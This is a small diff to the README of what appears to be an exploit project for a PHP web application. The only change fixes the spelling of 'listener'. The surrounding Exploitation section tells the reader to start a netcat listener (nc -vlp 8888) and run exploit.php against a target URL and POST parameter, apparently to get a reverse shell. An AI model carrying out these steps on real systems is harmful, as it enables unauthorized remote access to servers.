@@ -43,7 +43,7 @@ namespace Application\Controller{
 You can test it by running the curl commented in the code fragment above and you will get the message "hello asd".
 
 ## Exploitation
-* Set up a netcat listner(e.g. nc -vlp 8888)
+* Set up a netcat listener(e.g. nc -vlp 8888)
 * Run exploit.php either with exec permissions or via php php with the following command line:
 ```bash
 ./exploit.php http://url.to.attack netcat-ip-address  netcat-port post-parameter-to-attack 
